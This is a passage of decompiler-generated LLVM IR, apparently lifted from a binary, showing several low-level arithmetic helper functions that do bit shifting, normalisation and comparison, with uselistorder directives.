  %v0_3012c = load i32, i32* %r0.global-to-local, align 4
  %v2_3012c = icmp eq i1 %v2_30128, false
  %v5_3012c = sext i1 %v2_3012c to i32
  %v6_3012c = sub i32 %v5_3012c, %v0_3012c
  store i32 %v6_3012c, i32* %r0.global-to-local, align 4
  %v7_3012c = zext i1 %v2_3012c to i32
  %v8_3012c = icmp ne i32 %v6_3012c, %v7_3012c
  %v9_3012c = icmp ne i32 %v0_3012c, -1
  %v10_3012c = or i1 %v9_3012c, %v8_3012c
  %v11_3012c = icmp ne i32 %v0_3012c, 0
  %v12_3012c = select i1 %v2_3012c, i1 %v10_3012c, i1 %v11_3012c
  %v0_30130 = load i32, i32* %r1.global-to-local, align 4
  %v5_30130 = sext i1 %v12_3012c to i32
  %v6_30130 = sub i32 %v5_30130, %v0_30130
  store i32 %v6_30130, i32* @r1, align 4
  ret i32 %v6_3012c

; uselistorder directives
  uselistorder i1 %v2_3012c, { 1, 2, 0 }
  uselistorder i32 %v0_3012c, { 1, 2, 0 }
  uselistorder i32 %v8_3011c, { 1, 0 }
  uselistorder i32 %v0_30110, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_300fc, { 1, 0 }
  uselistorder i32 %v1_300f8, { 1, 0, 2 }
  uselistorder i32 %v0_300f0, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_30120, { 1, 0 }
}

define i32 @function_30134(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_30134:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_30134 = load i32, i32* %r1.global-to-local, align 4
  %v3_30138 = icmp ult i32 %v0_30134, 1048574
  br i1 %v3_30138, label %dec_label_pc_3017c, label %dec_label_pc_3013c

dec_label_pc_3013c:                               ; preds = %dec_label_pc_30134
  %v3_30140 = icmp ult i32 %v0_30134, 2097150
  br i1 %v3_30140, label %dec_label_pc_30160, label %dec_label_pc_30144

dec_label_pc_30144:                               ; preds = %dec_label_pc_3013c
  %v1_30144 = urem i32 %v0_30134, 2
  %v2_30144 = icmp ne i32 %v1_30144, 0
  %v3_30144 = udiv i32 %v0_30134, 2
  store i32 %v3_30144, i32* %r1.global-to-local, align 4
  %v0_30148 = load i32, i32* %r0.global-to-local, align 4
  %v3_30148 = zext i1 %v2_30144 to i32
  %v6_30148 = zext i32 %v0_30148 to i64
  %v7_30148 = sub i32 33, %v0_30148
  %v8_30148 = zext i32 %v7_30148 to i64
  %v9_30148 = shl i64 %v6_30148, %v8_30148
  %v10_30148 = sub i32 32, %v0_30148
  %v11_30148 = shl i32 %v3_30148, %v10_30148
  %v12_30148 = zext i32 %v11_30148 to i64
  %v14_30148 = or i64 %v12_30148, %v9_30148
  %v15_30148 = trunc i64 %v14_30148 to i32
  %v16_30148 = add i32 %v0_30148, -1
  %v17_30148 = shl i32 1, %v16_30148
  %v18_30148 = and i32 %v17_30148, %v0_30148
  %v19_30148 = icmp ne i32 %v18_30148, 0
  store i32 %v15_30148, i32* %r0.global-to-local, align 4
  %v0_3014c = load i32, i32* @ip, align 4
  %v3_3014c = zext i1 %v19_30148 to i32
  %v6_3014c = zext i32 %v0_3014c to i64
  %v7_3014c = sub i32 33, %v0_3014c
  %v8_3014c = zext i32 %v7_3014c to i64
  %v9_3014c = shl i64 %v6_3014c, %v8_3014c
  %v10_3014c = sub i32 32, %v0_3014c
  %v11_3014c = shl i32 %v3_3014c, %v10_3014c
  %v12_3014c = zext i32 %v11_3014c to i64
  %v14_3014c = or i64 %v12_3014c, %v9_3014c
  %v15_3014c = trunc i64 %v14_3014c to i32
  store i32 %v15_3014c, i32* @ip, align 4
  %v0_30150 = load i32, i32* @r4, align 4
  %v1_30150 = add i32 %v0_30150, 1
  store i32 %v1_30150, i32* @r4, align 4
  %v3_30154 = mul i32 %v1_30150, 2097152
  %v2_30158 = icmp ugt i32 %v3_30154, -4194305
  call void @__pseudo_cond_branch(i1 %v2_30158, i32 ptrtoint (i32* @global_var_30310.3617 to i32))
  br label %dec_label_pc_30160

dec_label_pc_30160:                               ; preds = %dec_label_pc_3017c, %dec_label_pc_3013c, %dec_label_pc_30144
  %v0_30160 = load i32, i32* @ip, align 4
  %v2_30160 = icmp slt i32 %v0_30160, 0
  %v6_30160 = icmp eq i32 %v0_30160, -2147483648
  %v1_30164 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_30160, label %bb, label %dec_label_pc_30160._crit_edge

bb:                                               ; preds = %dec_label_pc_30160
  %v2_30164 = urem i32 %v1_30164, 2
  %v3_30164 = icmp ne i32 %v2_30164, 0
  br label %dec_label_pc_30160._crit_edge

dec_label_pc_30160._crit_edge:                    ; preds = %dec_label_pc_30160, %bb
  %v1_30168 = phi i1 [ %v3_30164, %bb ], [ %v2_30160, %dec_label_pc_30160 ]
  %v2_30168 = zext i1 %v1_30168 to i32
  %v3_30168 = add i32 %v2_30168, %v1_30164
  store i32 %v3_30168, i32* %r0.global-to-local, align 4
  %v0_3016c = load i32, i32* %r1.global-to-local, align 4
  %v1_3016c = load i32, i32* @r4, align 4
  %v2_3016c = and i32 %v1_3016c, 4096
  %v3_3016c = icmp ne i32 %v2_3016c, 0
  %v4_3016c = mul i32 %v1_3016c, 1048576
  %v6_3016c = add i32 %v4_3016c, %v0_3016c
  %v7_3016c = zext i1 %v3_3016c to i32
  %v8_3016c = add i32 %v7_3016c, %v6_3016c
  %v1_30170 = load i32, i32* @r5, align 4
  %v2_30170 = or i32 %v1_30170, %v8_3016c
  store i32 %v2_30170, i32* %r1.global-to-local, align 4
  ret i32 %v3_30168

dec_label_pc_3017c:                               ; preds = %dec_label_pc_30134
  %v0_3017c = load i32, i32* @ip, align 4
  %v1_3017c = icmp slt i32 %v0_3017c, 0
  %v2_3017c = mul i32 %v0_3017c, 2
  store i32 %v2_3017c, i32* @ip, align 4
  %v0_30180 = load i32, i32* %r0.global-to-local, align 4
  %v3_30180 = mul i32 %v0_30180, 2
  %v4_30180 = zext i1 %v1_3017c to i32
  %v5_30180 = or i32 %v3_30180, %v4_30180
  store i32 %v5_30180, i32* %r0.global-to-local, align 4
  %v9_30180 = icmp ule i32 %v5_30180, %v0_30180
  %v10_30180 = icmp ult i32 %v3_30180, %v0_30180
  %v11_30180 = select i1 %v1_3017c, i1 %v9_30180, i1 %v10_30180
  %v3_30184 = mul i32 %v0_30134, 2
  %v4_30184 = zext i1 %v11_30180 to i32
  %v5_30184 = or i32 %v4_30184, %v3_30184
  store i32 %v5_30184, i32* %r1.global-to-local, align 4
  %v1_30188 = and i32 %v3_30184, 1048576
  %v2_30188 = icmp eq i32 %v1_30188, 0
  %v0_3018c = load i32, i32* @r4, align 4
  %v1_3018c = add i32 %v0_3018c, -1
  store i32 %v1_3018c, i32* @r4, align 4
  br i1 %v2_30188, label %bb7, label %dec_label_pc_30160

bb7:                                              ; preds = %dec_label_pc_3017c
  ret i32 %v5_30180

; uselistorder directives
  uselistorder i32 %v0_30180, { 1, 2, 0 }
  uselistorder i1 %v1_3017c, { 1, 0 }
  uselistorder i32 %v1_30164, { 1, 0 }
  uselistorder i32 %v0_30160, { 1, 0 }
  uselistorder i32 %v0_3014c, { 1, 0, 2 }
  uselistorder i32 %v0_30148, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_30160._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_30160, { 0, 2, 1 }
}

define i32 @function_30194() local_unnamed_addr {
dec_label_pc_30194:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_30194 = load i32, i32* @r1, align 4
  %v2_30194 = icmp eq i32 %v0_30194, 0
  br i1 %v2_30194, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_30194
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_30194
  %v1_301a010 = load i32, i32* @r0, align 4
  store i32 %v1_301a010, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_301fc = phi i32 [ %v0_30194, %bb ], [ %v1_301a010, %bb38 ]
  %v1_301b4 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_301ac = icmp ugt i32 %v0_301fc, 65535
  br i1 %v2_301ac, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_301b0 = and i32 %v0_301fc, 32768
  %v3_301b0 = icmp eq i32 %v2_301b0, 0
  %v4_301b0 = udiv i32 %v0_301fc, 65536
  br i1 %v3_301b0, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_301b4 = add nsw i32 %v1_301b4, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_301c0 = phi i32 [ %v1_301b4, %.thread ], [ %v1_301b4, %bb39 ], [ %v2_301b4, %bb40 ]
  %v1_301bc = phi i32 [ %v0_301fc, %.thread ], [ %v4_301b0, %bb39 ], [ %v4_301b0, %bb40 ]
  %v2_301b8 = icmp ugt i32 %v1_301bc, 255
  br i1 %v2_301b8, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_301bc = and i32 %v1_301bc, 128
  %v3_301bc = icmp eq i32 %v2_301bc, 0
  %v4_301bc = udiv i32 %v1_301bc, 256
  br i1 %v3_301bc, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_301c0 = add nsw i32 %v1_301c0, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_301cc = phi i32 [ %v1_301c0, %.thread3 ], [ %v1_301c0, %bb41 ], [ %v2_301c0, %bb42 ]
  %v1_301c8 = phi i32 [ %v1_301bc, %.thread3 ], [ %v4_301bc, %bb41 ], [ %v4_301bc, %bb42 ]
  %v2_301c4 = icmp ugt i32 %v1_301c8, 15
  br i1 %v2_301c4, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_301c8 = and i32 %v1_301c8, 8
  %v3_301c8 = icmp eq i32 %v2_301c8, 0
  %v4_301c8 = udiv i32 %v1_301c8, 16
  br i1 %v3_301c8, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_301cc = add nsw i32 %v1_301cc, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_301d4 = phi i32 [ %v1_301cc, %.thread4 ], [ %v1_301cc, %bb43 ], [ %v2_301cc, %bb44 ]
  %v1_301dc = phi i32 [ %v1_301c8, %.thread4 ], [ %v4_301c8, %bb43 ], [ %v4_301c8, %bb44 ]
  %v2_301d0 = icmp ugt i32 %v1_301dc, 3
  br i1 %v2_301d0, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_301d4 = add i32 %v1_301d4, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_301d8 = udiv i32 %v1_301dc, 2
  %v6_301d8 = sub i32 %v1_301d4, %v5_301d8
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_301dc = phi i32 [ %v6_301d8, %.thread6 ], [ %v2_301d4, %bb45 ]
  %v4_301dc = udiv i32 %v1_301dc, 8
  %v5_301dc = sub i32 %v0_301dc, %v4_301dc
  %v2_301e0 = add i32 %v5_301dc, -32
  %v4_301e0 = sub i32 31, %v5_301dc
  %v5_301e0 = and i32 %v4_301e0, %v5_301dc
  %v8_301e0 = icmp eq i32 %v5_301dc, 32
  %v6_301e4 = icmp slt i32 %v5_301dc, 32
  br i1 %v6_301e4, label %dec_label_pc_301e8, label %dec_label_pc_30208

dec_label_pc_301e8:                               ; preds = %bb46
  %v2_301e8 = add i32 %v5_301dc, -20
  %v7_301ec = icmp sgt i32 %v2_301e0, -12
  br i1 %v7_301ec, label %dec_label_pc_301f0, label %dec_label_pc_30204

dec_label_pc_301f0:                               ; preds = %dec_label_pc_301e8
  %v1_301f4 = sub i32 32, %v5_301dc
  %v6_301f8 = shl i32 %v0_301fc, %v5_301dc
  store i32 %v6_301f8, i32* @r0, align 4
  %v6_301fc = lshr i32 %v0_301fc, %v1_301f4
  store i32 %v6_301fc, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_30204:                               ; preds = %dec_label_pc_301e8
  %v8_301e8 = icmp eq i32 %v2_301e8, 0
  %v4_301e8 = add i32 %v5_301dc, 2147483616
  %v5_301e8 = and i32 %v2_301e8, %v4_301e8
  br label %dec_label_pc_30208

dec_label_pc_30208:                               ; preds = %bb46, %dec_label_pc_30204
  %v1_30214.in = phi i32 [ %v2_301e0, %bb46 ], [ %v2_301e8, %dec_label_pc_30204 ]
  %v6_30214 = phi i32 [ %v2_301e0, %bb46 ], [ %v5_301dc, %dec_label_pc_30204 ]
  %v2_30214.in = phi i32 [ %v5_301e0, %bb46 ], [ %v5_301e8, %dec_label_pc_30204 ]
  %v0_30214 = phi i1 [ %v8_301e0, %bb46 ], [ %v8_301e8, %dec_label_pc_30204 ]
  %v1_30214 = icmp slt i32 %v1_30214.in, 0
  %v2_30214 = icmp slt i32 %v2_30214.in, 0
  %v3_30208 = xor i1 %v2_30214, %v1_30214
  %v4_30208 = or i1 %v0_30214, %v3_30208
  br i1 %v4_30208, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_30208
  %v6_30208 = sub i32 32, %v6_30214
  store i32 %v6_30208, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_30208, %bb47
  %v6_3020c = shl i32 %v0_301fc, %v6_30214
  store i32 %v6_3020c, i32* %r1.global-to-local, align 4
  br i1 %v4_30208, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_30210 = load i32, i32* @r0, align 4
  %v7_30210 = load i32, i32* @ip, align 4
  %v12_30210 = lshr i32 %v6_30210, %v7_30210
  %v13_30210 = or i32 %v12_30210, %v6_3020c
  store i32 %v13_30210, i32* %r1.global-to-local, align 4
  %v11_30214 = shl i32 %v6_30210, %v6_30214
  store i32 %v11_30214, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_301f0, %bb49
  %v6_3021c = phi i32 [ %v6_301fc, %dec_label_pc_301f0 ], [ %v13_30210, %bb49 ], [ %v6_3020c, %bb48 ]
  %v0_30218 = load i32, i32* @r4, align 4
  %v2_30218 = sub i32 %v0_30218, %v5_301dc
  store i32 %v2_30218, i32* %r4.global-to-local, align 4
  %v4_30218 = xor i32 %v0_30218, %v5_301dc
  %v5_30218 = xor i32 %v2_30218, %v0_30218
  %v6_30218 = and i32 %v5_30218, %v4_30218
  %v7_30218 = icmp slt i32 %v6_30218, 0
  %v8_30218 = icmp slt i32 %v2_30218, 0
  %v5_3021c = icmp slt i32 %v0_30218, %v5_301dc
  br i1 %v5_3021c, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_3021c = mul i32 %v2_30218, 1048576
  %v11_3021c = add i32 %v10_3021c, %v6_3021c
  %v7_30220 = load i32, i32* @r5, align 4
  %v8_30220 = or i32 %v7_30220, %v11_3021c
  store i32 %v8_30220, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_30228 = xor i1 %v8_30218, %v7_30218
  %v4_30228 = xor i1 %v3_30228, true
  call void @__pseudo_cond_branch(i1 %v4_30228, i32 %tmp33)
  %v0_3022c = load i32, i32* %r4.global-to-local, align 4
  %v2_30230 = sub i32 -32, %v0_3022c
  store i32 %v2_30230, i32* %r4.global-to-local, align 4
  %v6_30234 = icmp sgt i32 %v0_3022c, -32
  br i1 %v6_30234, label %dec_label_pc_30238, label %dec_label_pc_30278

dec_label_pc_30238:                               ; preds = %.thread8
  %v1_30238 = add i32 %v2_30230, 12
  store i32 %v1_30238, i32* %r4.global-to-local, align 4
  %v8_3023c = icmp sgt i32 %v1_30238, 0
  br i1 %v8_3023c, label %dec_label_pc_3025c, label %dec_label_pc_30240

dec_label_pc_30240:                               ; preds = %dec_label_pc_30238
  %v1_30240 = add i32 %v2_30230, 32
  %v1_30244 = sub i32 0, %v2_30230
  %v0_30248 = load i32, i32* @r0, align 4
  %v6_30248 = lshr i32 %v0_30248, %v1_30240
  %v1_3024c = load i32, i32* %r1.global-to-local, align 4
  %v7_3024c = shl i32 %v1_3024c, %v1_30244
  %v8_3024c = or i32 %v7_3024c, %v6_30248
  %v0_30250 = load i32, i32* @r5, align 4
  %v7_30250 = lshr i32 %v1_3024c, %v1_30240
  %v8_30250 = or i32 %v0_30250, %v7_30250
  store i32 %v8_30250, i32* %r1.global-to-local, align 4
  %v2_30254 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_30254, i32* %r4.global-to-local, align 4
  ret i32 %v8_3024c

dec_label_pc_3025c:                               ; preds = %dec_label_pc_30238
  %v1_3025c = sub i32 0, %v2_30230
  %v1_30260 = add i32 %v2_30230, 32
  %v0_30264 = load i32, i32* @r0, align 4
  %v6_30264 = lshr i32 %v0_30264, %v1_30260
  %v1_30268 = load i32, i32* %r1.global-to-local, align 4
  %v7_30268 = shl i32 %v1_30268, %v1_3025c
  %v8_30268 = or i32 %v7_30268, %v6_30264
  %v0_3026c = load i32, i32* @r5, align 4
  store i32 %v0_3026c, i32* %r1.global-to-local, align 4
  %v2_30270 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_30270, i32* %r4.global-to-local, align 4
  ret i32 %v8_30268

dec_label_pc_30278:                               ; preds = %.thread8
  %v0_30278 = load i32, i32* %r1.global-to-local, align 4
  %v6_30278 = lshr i32 %v0_30278, %v2_30230
  %v0_3027c = load i32, i32* @r5, align 4
  store i32 %v0_3027c, i32* %r1.global-to-local, align 4
  %v2_30280 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_30280, i32* %r4.global-to-local, align 4
  ret i32 %v6_30278

; uselistorder directives
  uselistorder i32 %v2_30230, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_30218, { 1, 2, 0, 3 }
  uselistorder i32 %v0_30218, { 2, 0, 1, 3 }
  uselistorder i32 %v6_3020c, { 1, 0, 2 }
  uselistorder i32 %v2_301e0, { 1, 0, 2 }
  uselistorder i32 %v5_301dc, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_301c8, { 1, 0 }
  uselistorder i32 %v1_301c8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_301bc, { 1, 0 }
  uselistorder i32 %v1_301bc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_301b0, { 1, 0 }
  uselistorder i32 %v0_301fc, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 3, 2, 1, 4, 13, 14, 5, 16, 17, 6, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 23, 7, 24, 26, 27, 25, 0 }
  uselistorder i32 -20, { 1, 4, 2, 0, 3 }
  uselistorder i32 -4, { 10, 2, 11, 49, 50, 51, 52, 53, 54, 0, 1, 48, 12, 55, 13, 21, 72, 73, 74, 6, 22, 23, 24, 75, 76, 77, 7, 25, 26, 27, 78, 79, 80, 8, 28, 29, 81, 20, 19, 82, 83, 84, 18, 17, 16, 15, 30, 31, 32, 33, 34, 5, 35, 3, 36, 4, 85, 14, 37, 45, 46, 47, 38, 39, 60, 61, 62, 9, 63, 64, 65, 40, 59, 66, 67, 68, 69, 70, 71, 41, 56, 57, 58, 42, 43, 44 }
  uselistorder i32 -8, { 9, 10, 1, 38, 11, 12, 13, 39, 20, 21, 22, 23, 24, 25, 19, 18, 8, 17, 16, 15, 14, 26, 27, 28, 29, 30, 42, 43, 31, 32, 44, 33, 45, 37, 34, 35, 36, 2, 40, 41, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 255, { 8, 9, 5, 12, 13, 4, 6, 7, 11, 0, 1, 2, 3, 14, 10 }
  uselistorder i32 -16, { 2, 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22 }
  uselistorder i32 65535, { 4, 5, 2, 1, 3, 6, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_30208, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_30288(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_30288:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_30288 = load i32, i32* @r4, align 4
  %v2_30288 = icmp eq i32 %v0_30288, 0
  %v1_3028c = xor i32 %arg3, 1048576
  store i32 %v1_3028c, i32* @r3, align 4
  br i1 %v2_30288, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_30288
  %v1_30290 = load i32, i32* @r1, align 4
  %v2_30290 = xor i32 %v1_30290, 1048576
  store i32 %v2_30290, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_30288
  %v1_30298 = load i32, i32* @r5, align 4
  %v2_30298 = add i32 %v1_30298, -1
  store i32 %v2_30298, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_3029c = call i32 @function_300e0()
  store i32 %v0_3029c, i32* %r0.global-to-local, align 4
  %v0_302a0 = load i32, i32* @r4, align 4
  %v0_302a0.off = add i32 %v0_302a0, 4194303
  %tmp = icmp ult i32 %v0_302a0.off, 2097152
  %v1_30330 = load i32, i32* @r5, align 4
  %v1_30330.off = add i32 %v1_30330, 4194303
  %tmp44 = icmp ult i32 %v1_30330.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_302ac

dec_label_pc_302ac:                               ; preds = %bb30
  %v4_302ac = icmp eq i32 %v1_30330, %v0_302a0
  br i1 %v4_302ac, label %bb31, label %dec_label_pc_302b8

bb31:                                             ; preds = %dec_label_pc_302ac
  %v2_302b0 = load i32, i32* @r2, align 4
  %v5_302b0 = icmp eq i32 %v2_302b0, %v0_3029c
  br i1 %v5_302b0, label %dec_label_pc_302cc, label %dec_label_pc_302b8

dec_label_pc_302b8:                               ; preds = %dec_label_pc_302ac, %bb31
  %v2_302b8 = or i32 %v0_302a0, %v0_3029c
  %v4_302b8 = icmp eq i32 %v2_302b8, 0
  br i1 %v4_302b8, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_302b8
  %v1_302c0 = load i32, i32* @r2, align 4
  store i32 %v1_302c0, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_302b8, %bb32
  %v1_302c8 = phi i32 [ %v0_3029c, %dec_label_pc_302b8 ], [ %v1_302c0, %bb32 ]
  ret i32 %v1_302c8

dec_label_pc_302cc:                               ; preds = %bb31
  %v0_302cc = load i32, i32* @r1, align 4
  %v1_302cc = load i32, i32* @r3, align 4
  %v4_302cc = icmp eq i32 %v1_302cc, %v0_302cc
  br i1 %v4_302cc, label %dec_label_pc_302cc..thread8_crit_edge, label %bb33

dec_label_pc_302cc..thread8_crit_edge:            ; preds = %dec_label_pc_302cc
  %v0_302dc.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_302cc
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_302cc..thread8_crit_edge, %bb33
  %v0_302dc = phi i32 [ %v0_302dc.pre, %dec_label_pc_302cc..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_302dc = xor i1 %v4_302cc, true
  call void @__pseudo_cond_branch(i1 %v2_302dc, i32 %v0_302dc)
  %v0_302e0 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_302e0, 2097152
  br i1 %tmp45, label %dec_label_pc_302e8, label %dec_label_pc_302fc

dec_label_pc_302e8:                               ; preds = %.thread8
  %v0_302e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_302e8 = icmp slt i32 %v0_302e8, 0
  %v2_302e8 = mul i32 %v0_302e8, 2
  store i32 %v2_302e8, i32* %r0.global-to-local, align 4
  %v0_302ec = load i32, i32* @r1, align 4
  %v3_302ec = mul i32 %v0_302ec, 2
  %v4_302ec = zext i1 %v1_302e8 to i32
  %v5_302ec = or i32 %v3_302ec, %v4_302ec
  %v9_302ec = icmp ule i32 %v5_302ec, %v0_302ec
  %v10_302ec = icmp ult i32 %v3_302ec, %v0_302ec
  %v11_302ec = select i1 %v1_302e8, i1 %v9_302ec, i1 %v10_302ec
  br i1 %v11_302ec, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_302e8
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_302e8, %bb34
  ret i32 %v2_302e8

dec_label_pc_302fc:                               ; preds = %.thread8
  %v2_302fc = icmp ugt i32 %v0_302e0, -4194305
  br i1 %v2_302fc, label %dec_label_pc_302fc..thread9_crit_edge, label %bb36

dec_label_pc_302fc..thread9_crit_edge:            ; preds = %dec_label_pc_302fc
  %v0_30308.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_302fc
  %v1_30300 = load i32, i32* @r1, align 4
  %v2_30300 = add i32 %v1_30300, 1048576
  store i32 %v2_30300, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_302fc..thread9_crit_edge, %bb36
  %v0_30308 = phi i32 [ %v0_30308.pre, %dec_label_pc_302fc..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_30308 = xor i1 %v2_302fc, true
  call void @__pseudo_cond_branch(i1 %v2_30308, i32 %v0_30308)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_3033c.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_3033c.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_30328 = load i32, i32* @r3, align 4
  %v1_3032c = load i32, i32* @r2, align 4
  store i32 %v1_3032c, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_3033c23 = phi i32 [ %v1_3033c.pre, %.thread14 ], [ %v1_30328, %bb37 ]
  %v1_30338 = phi i32 [ %v0_3029c, %.thread14 ], [ %v1_3032c, %bb37 ]
  store i32 %v1_30338, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_30348 = phi i32 [ %v1_3033c23, %bb38 ], [ %v1_3033c.pre, %.thread11 ]
  %v1_30350 = phi i32 [ %v1_30338, %bb38 ], [ %v0_3029c, %.thread11 ]
  %v4_3033c = mul i32 %v1_30348, 4096
  %v5_3033c = or i32 %v4_3033c, %v1_30350
  %v7_3033c = icmp eq i32 %v5_3033c, 0
  br i1 %v7_3033c, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_30340 = load i32, i32* @r2, align 4
  %v2_30340 = load i32, i32* @r3, align 4
  %v5_30340 = mul i32 %v2_30340, 4096
  %v6_30340 = or i32 %v5_30340, %v1_30340
  %v8_30340 = icmp eq i32 %v6_30340, 0
  br i1 %v8_30340, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_30344 = icmp eq i32 %v2_30340, %v1_30348
  br i1 %v5_30344, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_30350

; uselistorder directives
  uselistorder i32 %v1_3033c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_302ec, { 1, 2, 0 }
  uselistorder i32 %v2_302e8, { 1, 0 }
  uselistorder i1 %v1_302e8, { 1, 0 }
  uselistorder i32 %v0_302e0, { 1, 0 }
  uselistorder i1 %v4_302cc, { 1, 0 }
  uselistorder i32 %v0_302a0, { 2, 0, 1 }
  uselistorder i32 %v0_3029c, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_302b8, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

